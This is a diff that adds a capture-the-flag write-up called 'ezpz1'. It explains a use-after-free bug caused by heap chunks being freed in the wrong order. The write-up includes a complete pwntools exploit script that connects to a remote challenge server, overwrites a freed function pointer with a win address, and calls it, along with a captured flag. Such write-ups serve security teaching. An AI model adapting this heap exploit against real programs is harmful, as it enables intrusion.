@@ -112,3 +112,86 @@ pwnHint(9)
 p.interactive()
 ```
 
+# ezpz1
+
+> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MSIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiJiNTgyYjYzNC1iMTRmLTRmNTUtYjk4NC1iODRlNTIzMTRhODQifQ.4rsVwrrOPi4_QH_pnZhEAfXEZ091FrVKrkZkhhqieO0}
+
+## Scenario
+
+The program performs two malloc calls for each question creation.  
+When freed, if they are not cleared - their contents can be accessed.  
+The order of freeing is also important, as the last freed item becomes the head of the free list.
+
+## Solution
+
+When creating and freeing a question, the two allocated chunks are freed in the wrong order.  
+By still having access to previous container chunk, we can set the contents of a new question - which will actually modify the previous container chunk.
+
+## Script
+
+```python3
+#!/usr/bin/python3
+
+'''
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+'''
+
+from pwn import *
+
+# p = process("./ezpz1")
+p = remote("plsdonthaq.me", 7001)
+
+winAddr = 0x8048a5c
+
+wait = lambda: p.recvuntil("Enter your choice, (or press enter to refresh): ")
+
+def create():
+    p.sendline("C")
+    wait()
+
+def delete(id):
+    p.sendline("D")
+    p.sendline(str(id))
+    wait()
+
+def set(id, str_0x18):
+    p.sendline("S")
+    p.sendline(str(id))
+    p.sendline(str_0x18)
+    wait()
+
+def ask(id):
+    p.sendline("A")
+    p.sendline(str(id))
+    # wait()
+
+wait()
+
+######
+
+create()  # Create question 0 (malloc container0, malloc buffer0)
+delete(0) # Delete question 0 (free container0, free buffer0)
+'''
+    The free list is now
+    HEAD:[buffer0]->[container0]
+'''
+
+create() # Create question 1 (malloc container1, malloc buffer1)
+'''
+    Question 1 uses [buffer0] as the container, and [container1] as the buffer
+'''
+
+set(1, p32(winAddr)) # Set *[buffer1] to the win address
+'''
+    But, [buffer1] == [container0]
+    So we're setting *[container0] to the win address
+'''
+
+ask(0) # Call *[container0]
+p.interactive()
+```
+
